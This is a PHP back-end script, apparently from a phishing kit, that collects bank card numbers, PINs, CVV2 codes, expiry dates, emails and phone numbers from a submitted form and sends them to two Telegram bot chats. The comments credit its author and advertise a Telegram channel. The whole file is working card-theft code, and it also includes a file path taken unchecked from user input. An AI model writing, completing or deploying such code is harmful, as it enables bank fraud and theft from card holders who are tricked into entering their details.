<?php


//Just For BankInfo!
include"Bankinfo.php";
$date=strftime("%Y-%m-%d %H:%M:%S",time());

$ip=$_SERVER["REMOTE_ADDR"];

//CODED_BY AZERAKHSH_HUNTER//
//@IRANBOFFICIAL
//Join_US_Please




if($_POST['pan1']){
$pan = $_POST['pan1'];
$pin = $_POST['pin1'];
$cvv = $_POST['cvv21'];
$month = $_POST['month1'];
$year = $_POST['year1'];
$email = $_POST['email'];
$pno = $_POST['phone'];
$ORDER = $_POST['order'];
include"../Users/$ORDER.php";
include"../INFO.php";



//BANK INFO
$pan1 = substr($pan,0,4);
$pan2 = substr($pan,4,-8);
$pan3 = substr($pan,8,-4);
$pan4 = substr($pan,12);
$cardn = substr($pan,0,-10);
$bankinfo = bank_information($cardn);
//BANK INFO


$Text = "

🔱Card: <code>$pan1 $pan2 $pan3 $pan4</code>
🅿️Pass2: <code>$pin</code>
🔆Cvv2: <code>$cvv</code>
📅Year: <code>$year</code>  Month: <code>$month</code>

⚡️:@$chanel
$bankinfo[0]";


		$FuckIT =  file_get_contents("https://api.telegram.org/bot".$TOKEN."/SendMessage?parse_mode=HTML&chat_id=".$ID."&text=".urlencode($Text));
		 $FuckIT = file_get_contents("https://api.telegram.org/bot".$TOKENS."/sendMessage?parse_mode=HTML&chat_id=".$IDS."&text=".urlencode($Text));


//Send To User




}else{
    echo "You Don't Have Permision.";
}

   //CODED_BY AZERAKHSH_HUNTER//
//@IRANBOFFICIAL
//Join_US_Please

?>

